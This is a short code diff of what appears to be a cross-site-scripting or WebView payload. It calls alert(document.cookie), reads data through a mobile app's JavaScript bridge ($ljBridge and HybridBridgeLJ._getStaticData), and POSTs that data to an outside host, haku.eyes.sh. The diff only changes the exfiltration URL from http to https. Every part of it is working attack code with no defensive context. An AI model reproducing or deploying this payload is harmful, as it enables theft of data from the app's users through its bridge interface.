@@ -7,7 +7,7 @@ alert(document.cookie);
 $ljBridge.ready(function(bridge) {
     var data = bridge.getStaticData();
     alert(data);
-    fetch("http://haku.eyes.sh?beike", {
+    fetch("https://haku.eyes.sh?beike", {
         method: "POST",
         body: data
     });
@@ -15,7 +15,7 @@ $ljBridge.ready(function(bridge) {
 
 var data = window.HybridBridgeLJ._getStaticData();
 alert(data);
-fetch("http://haku.eyes.sh?beike", {
+fetch("https://haku.eyes.sh?beike", {
 method: "POST",
 body: data
 });
